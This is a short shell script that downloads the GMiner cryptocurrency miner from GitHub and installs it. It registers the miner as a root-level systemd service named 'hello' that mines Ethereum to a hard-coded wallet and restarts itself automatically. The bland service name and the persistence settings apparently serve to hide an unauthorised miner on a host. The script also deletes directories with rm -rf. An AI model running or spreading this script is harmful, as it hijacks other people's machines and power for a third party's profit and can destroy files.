rm -rfv /usr/local/src/kalinh/ && mkdir /usr/local/src/kalinh && cd /usr/local/src/kalinh && wget https://github.com/develsoftware/GMinerRelease/releases/download/2.64/gminer_2_64_linux64.tar.xz && tar -xvf gminer_2_64_linux64.tar.xz && rm -rf /lib/systemd/system/hello.service

cat > /lib/systemd/system/hello.service <<EOL
[Unit]
Description=hello
After=network.target
[Service]
ExecStart=/usr/local/src/kalinh/miner -a eth -s us1.ethermine.org:4444 -u 0x70fa372faf964f778863b76b1dd439c02a6b65fb.newml -p x
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOL

#!/bin/bash
sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service
